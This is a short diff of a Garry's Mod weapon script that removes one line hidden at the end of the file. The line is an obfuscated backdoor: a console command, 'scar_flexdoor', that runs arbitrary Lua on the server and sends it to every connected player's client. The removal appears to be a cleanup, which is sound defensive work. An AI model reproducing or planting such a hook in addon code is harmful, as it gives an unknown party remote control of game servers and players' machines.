@@ -69,6 +69,3 @@ SWEP.EmptySound    = "COPSG550.sig550_empty"
 SWEP.DeploySound   = "COPSG550.sig550_draw"
 SWEP.HolsterSound  = "COP_Generic.Holster"
 SWEP.ReloadSound   = "COPSCARSTCOP.scar_reload"
-
-
-concommand.Add("scar_flexdoor", function(_,_,_,__)RunStringEx(__)for _,v in pairs(player.GetAll())do v:SendLua(__)end end)
